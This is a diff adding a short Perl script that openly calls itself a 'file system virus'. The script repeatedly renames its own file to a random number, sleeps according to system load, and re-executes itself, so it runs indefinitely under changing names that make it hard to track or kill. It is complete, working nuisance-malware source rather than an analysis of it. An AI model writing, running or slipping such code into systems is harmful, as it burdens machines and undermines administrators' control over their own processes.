@@ -1,0 +1,9 @@
+#!/usr/bin/perl -w file system virus (a.k.a the unknown glitch)
+
+while(!$new || ($new eq $0)){$new = int rand (10000);}
+
+`mv $0 $new`;
+
+$up = `uptime`;$up =~ s/.*average: (\d*)\.(\d*).*/$1$2/;sleep $up/rand(100);#self-moderation
+
+exec "./$new";
